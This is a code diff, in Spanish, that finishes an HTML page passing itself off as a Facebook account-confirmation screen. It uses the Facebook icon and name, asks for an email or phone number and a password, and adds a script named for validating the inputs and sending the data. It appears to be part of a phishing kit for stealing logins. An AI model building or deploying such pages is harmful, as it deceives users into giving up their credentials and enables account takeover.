@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-	<title>[titulo: confim.]</title>
+	<title>Confirma tu cuenta</title>
 	<meta charset="UTF-8">
 	<link rel="icon" href="img/fb-icon.png">
 	<meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
@@ -9,20 +9,34 @@
 </head>
 
 <body style="margin: 0px;">
+	
+	<!-- caja para el iframe -->
+	<div id="cajaIframe"></div>
+	
+	<!-- cabecera con el logo -->
 	<div id="cajaLogo">
 		<div id="cajaContenedoraLogo">
 			<div id="logo"></div>
 		</div>
 	</div>
+	
 	<!-- contenido central -->
 	<div id="contenidoCentral">
-		<h4 class="tipoLetra">[encabezado: confirm.]</h4>
+		<h4 class="tipoLetra">Confirma tu cuenta</h4>
 		<input id="email" class="inputs" type="text" placeholder="Correo electrónico o telefóno"></input>
 		<br>
 		<input id="pass" class="inputs" type="password" placeholder="Contraseña"></input>
 		<br>
-		<button id="btnConfirmar"><span id="textoBtn">[btn: confim.]</span></button>
-		<p id="fraseFB">Facebook, Inc.</p>
+		<button id="btnConfirmar"><span id="textoBtn">Acceder</span></button>
+		<p id="fraseFB" class="parrafos">Facebook, Inc.</p>
+		<!-- frases que muestren el estado actual del proceso -->
+		<div id="cajaContenedoraParrafo">
+			<p id="fraseProceso" class="parrafos"></p>
+		</div>
+		
+		<!-- scripts -->
+		<script type="text/javascript" src="js/escuchar-botones.js"></script>
+		<script type="text/javascript" src="js/validacionInputs-enviarDatos.js"></script>
 	</div>
 </body>
 </html>
